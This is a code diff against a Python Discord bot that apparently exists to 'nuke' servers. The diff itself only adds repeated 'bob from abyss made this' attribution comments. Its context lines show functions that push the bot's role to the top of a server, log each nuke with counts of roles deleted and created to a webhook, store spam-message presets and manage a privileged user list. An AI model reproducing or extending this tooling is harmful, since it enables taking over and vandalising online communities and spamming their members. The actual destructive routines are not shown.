@@ -1,3 +1,5 @@
+# bob from abyss made this
+
 import json
 import random
 import aiohttp
@@ -53,6 +55,7 @@ def save_supreme_access():
     except Exception as e:
         print(f"Error saving Supreme_Acess.json: {e}")
         return False
+# bob from abyss made this
 
 SUPREME_USERS = load_supreme_access()
 
@@ -94,6 +97,7 @@ def save_blacklist():
 
 load_blacklist()
 
+# bob from abyss made this
 
 AUTO_LEAVE_SECONDS = 6 * 60 * 60  # 6 hours
 
@@ -138,6 +142,7 @@ def schedule_auto_leave(guild_id, remaining_seconds):
     auto_leave_tasks[guild_id] = asyncio.create_task(
         auto_leave_after(guild_id, max(remaining_seconds, 0))
     )
+# bob from abyss made this
 
 
 intents = discord.Intents.default()
@@ -180,6 +185,7 @@ class RateLimiter:
                     wait = 1.1 - (now - ch_deque[0]).total_seconds()
                     if wait > 0:
                         await asyncio.sleep(wait)
+# bob from abyss made this
 
 limiter = RateLimiter()
 
@@ -215,6 +221,8 @@ async def bump_bot_role(guild):
 
         await top_role.edit(position=len(guild.roles) - 1, reason="ROLE BUMP")
         await asyncio.sleep(0.5)
+        # bob from abyss made this
+
         print(f"bump_bot_role: bumped '{top_role.name}' to top in '{guild.name}'")
         return True
     except discord.Forbidden as e:
@@ -267,6 +275,7 @@ async def record_nuke(guild, inviter):
                 "last_nuke": None,
                 "nuke_history": []
             }
+# bob from abyss made this
 
         nuke_record = {
             "server_id": str(guild.id),
@@ -304,6 +313,7 @@ async def record_nuke(guild, inviter):
                 if attempt == 3:
                     raise
                 await asyncio.sleep(2)
+# bob from abyss made this
 
     except Exception as e:
         print(f"Error recording nuke: {type(e).__name__}: {e}")
@@ -337,7 +347,8 @@ async def send_webhook(guild, inviter, invite_url, roles_deleted=0, roles_create
         "thumbnail": {"url": icon_url} if icon_url else None,
         "timestamp": datetime.utcnow().isoformat()
     }
-    
+    # bob from abyss made this
+
     if embed["thumbnail"] is None:
         del embed["thumbnail"]
     
@@ -373,6 +384,8 @@ async def leave_servers_with_user(user_id):
                     break
         except:
             pass
+            # bob from abyss made this
+
 
 def is_guild_valid(guild):
     if guild is None:
@@ -414,6 +427,9 @@ class CreatePresetModal(ui.Modal, title="Create Custom Preset"):
         required=False,
         max_length=500
     )
+
+    # bob from abyss made this
+
     
     spam_message = ui.TextInput(
         label="Spam Message (use \\n for new lines)",
@@ -499,6 +515,9 @@ class DeletePresetSelect(ui.View):
         self.select = discord.ui.Select(placeholder="Choose preset to delete...", options=options)
         self.select.callback = self.select_callback
         self.add_item(self.select)
+
+# bob from abyss made this
+
     
     async def select_callback(self, interaction: discord.Interaction):
         try:
@@ -589,6 +608,7 @@ class PresetSelectView(ui.View):
             print(f"Error delete preset: {e}")
             await interaction.response.send_message(f"Error: {e}", ephemeral=True)
 
+# bob from abyss made this
 
 
 @bot.event
@@ -773,7 +793,8 @@ async def users(ctx, action=None, user_id: str = None):
         await ctx.send(embed=embed)
         await ctx.send("Usage: `.users [add/remove] [user_id]`")
         return
-    
+    # bob from abyss made this
+
     action = action.lower()
     
     if action not in ["add", "remove"]:
@@ -816,6 +837,7 @@ async def users(ctx, action=None, user_id: str = None):
                 await ctx.send(f"Removed {target_user} (`{target_id}`) from Supreme Access.")
             else:
                 await ctx.send("Failed to save. Check console.")
+# bob from abyss made this
 
 @bot.command()
 async def blacklist(ctx, action=None, target=None):
